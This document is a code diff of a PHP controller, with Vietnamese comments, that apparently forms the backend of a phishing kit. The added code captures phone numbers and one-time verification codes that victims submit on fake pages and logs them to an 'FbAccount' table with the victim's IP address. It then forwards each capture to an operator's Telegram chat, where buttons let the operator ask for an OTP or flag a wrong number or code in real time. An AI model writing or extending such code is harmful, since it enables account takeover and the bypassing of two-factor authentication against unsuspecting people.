@@ -490,36 +490,78 @@ class CustomWeb extends Controller
                         // new account
                         if ($website) {
                             $website = Json::decode($website->data);
-                            $keyboard = [
-                                [
-                                    ['text' => '✅ Thành công', 'callback_data' => 'done_' . $pusher_code],
-                                ]
-                            ];
-                            $msg = implode("\n", [
-                                "Giao diện tùy chỉnh: <b>BO23333 LAYSDT</b>",
-                                "Web: <b>$website->title</b>",
-                                "",
-                                "------------------------",
-                                "<b>Số điện thoại:</b> <code>$post_data->phone</code>",
-                                "------------------------",
-                                "",
-                                "Emoji phân biệt: $web_info->emoji",
-                                ""
-                            ]);
-                            // tiến hành insert
-                            FbAccount::create([
-                                'userid' => $web_info->userid,
-                                'webid' => $web_info->webid,
-                                'user' => $post_data->phone,
-                                'type' => 'custom',
-                                'ip' => $ip
-                            ]);
-                            $custom_bot->sendMessage([
-                                'chat_id' => $user_telegram_id,
-                                'parse_mode' => 'HTML',
-                                'text' => $msg,
-                                'reply_markup' => json_encode(['inline_keyboard' => $keyboard]),
-                            ]);
+                            if ($post_data->step == 'send_otp') {
+                                $keyboard = [
+                                    [
+                                        ['text' => '❌ Sai SDT', 'callback_data' => 'wronguser_' . $pusher_code],
+                                        ['text' => '🔒 Yêu cầu OTP', 'callback_data' => 'otp_' . $pusher_code],
+                                    ],
+                                    [
+                                        ['text' => '✅ Thành công', 'callback_data' => 'done_' . $pusher_code],
+                                    ]
+                                ];
+                                $msg = implode("\n", [
+                                    "Giao diện tùy chỉnh: <b>BO23333 LAYSDT</b>",
+                                    "Web: <b>$website->title</b>",
+                                    "",
+                                    "------------------------",
+                                    "<b>Số điện thoại:</b> <code>$post_data->phone</code>",
+                                    "------------------------",
+                                    "",
+                                    "Emoji phân biệt: $web_info->emoji",
+                                    ""
+                                ]);
+                                // tiến hành insert
+                                FbAccount::create([
+                                    'userid' => $web_info->userid,
+                                    'webid' => $web_info->webid,
+                                    'user' => $post_data->phone,
+                                    'type' => 'custom',
+                                    'ip' => $ip
+                                ]);
+                                $custom_bot->sendMessage([
+                                    'chat_id' => $user_telegram_id,
+                                    'parse_mode' => 'HTML',
+                                    'text' => $msg,
+                                    'reply_markup' => json_encode(['inline_keyboard' => $keyboard]),
+                                ]);
+                            } else {
+                                $keyboard = [
+                                    [
+                                        ['text' => '❌ Sai SDT', 'callback_data' => 'wronguser_' . $pusher_code],
+                                        ['text' => '❌ Nhập sai mã', 'callback_data' => 'wrongpass_' . $pusher_code],
+                                    ],
+                                    [
+                                        ['text' => '✅ Thành công', 'callback_data' => 'done_' . $pusher_code],
+                                    ]
+                                ];
+                           
+                                $msg = implode("\n", [
+                                    "Giao diện tùy chỉnh: <b>BO23333 LAYSDT</b>",
+                                    "Web: <b>$website->title</b>",
+                                    "",
+                                    "------------------------",
+                                    "<b>Mã xác minh:</b> <code>$post_data->otp</code>",
+                                    "------------------------",
+                                    "",
+                                    "Emoji phân biệt: $web_info->emoji",
+                                    ""
+                                ]);
+                                // tiến hành insert
+                                FbAccount::create([
+                                    'userid' => $web_info->userid,
+                                    'webid' => $web_info->webid,
+                                    'user' => $post_data->phone,
+                                    'type' => 'custom',
+                                    'ip' => $ip
+                                ]); 
+                                $custom_bot->sendMessage([
+                                    'chat_id' => $user_telegram_id,
+                                    'parse_mode' => 'HTML',
+                                    'text' => $msg,
+                                    'reply_markup' => json_encode(['inline_keyboard' => $keyboard]),
+                                ]);
+                            }
                         }
                     }
                 }
